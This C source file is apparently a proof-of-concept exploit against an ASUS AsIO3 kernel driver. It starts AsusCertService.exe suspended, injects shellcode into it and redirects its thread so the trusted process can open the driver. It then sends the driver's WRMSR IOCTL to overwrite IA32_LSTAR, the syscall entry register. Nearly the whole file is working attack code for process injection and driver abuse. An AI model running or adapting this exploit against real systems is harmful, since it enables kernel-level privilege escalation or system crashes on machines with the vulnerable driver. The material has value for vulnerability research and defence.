#include <Windows.h>
#include <stdio.h>

#include "shellcode.h"

#define SHELLCODE_OFFSET 0xa0

#define ASIO_RDMSR_IOCTL 0xA0406458
#define ASIO_WRMSR_IOCTL 0xA040A45C

#pragma pack(1)
typedef struct _ASIO_WRMSR
{
	ULONG Msr;
	ULONGLONG Value;
} ASIO_WRMSR;

int main( void )
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO startinfo;

	RtlSecureZeroMemory( &pinfo, sizeof( pinfo ) );
	RtlSecureZeroMemory( &startinfo, sizeof( startinfo ) );

	CONTEXT ctx;
	RtlSecureZeroMemory( &ctx, sizeof( ctx ) );

	if ( !CreateProcessW( L"AsusCertService.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startinfo, &pinfo ) )
		goto FINISH;

	printf( "[*] created suspended process: AsusCertService.exe\n" );

	SIZE_T bytes = 0;

	LPVOID base = VirtualAllocEx( pinfo.hProcess, NULL, sizeof( shellcode ), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if ( !base )
		goto FINISH;

	printf( "[*] allocated shellcode page: 0x%08x\n", ( DWORD ) base );

	WriteProcessMemory( pinfo.hProcess, base, shellcode, sizeof( shellcode ), &bytes );
	printf( "[*] wrote %i bytes to 0x%08x\n", bytes, ( DWORD ) base );

	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext( pinfo.hThread, &ctx );

	ctx.Eip = ( DWORD ) base + SHELLCODE_OFFSET;

	printf( "[*] modified thread context\n" );

	SetThreadContext( pinfo.hThread, &ctx );
	ResumeThread( pinfo.hThread );
	
	HANDLE dev_handle = INVALID_HANDLE_VALUE;
	do
	{
		dev_handle = CreateFileW( L"\\\\.\\Asusgio3", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	} while ( dev_handle == INVALID_HANDLE_VALUE );

	printf( "[*] obtained handle to device\n" );

	ASIO_WRMSR wrmsr_cmd;
	wrmsr_cmd.Msr = 0xC0000082;
	wrmsr_cmd.Value = 0;

	ULONGLONG msr_value = 0;

	SIZE_T ret = 0;

	if ( DeviceIoControl( dev_handle, ASIO_WRMSR_IOCTL, &wrmsr_cmd, sizeof( wrmsr_cmd ), &msr_value, sizeof( msr_value ), &ret, NULL ) )
		printf( "IA32_LSTAR: 0x%llx\n", msr_value );

	CloseHandle( dev_handle );

FINISH:
	TerminateProcess( pinfo.hProcess, 0 );

	CloseHandle( pinfo.hThread );
	CloseHandle( pinfo.hProcess );

	printf( "[!] Error: 0x%08x\n", GetLastError( ) );
	getchar( );

	return 0;
}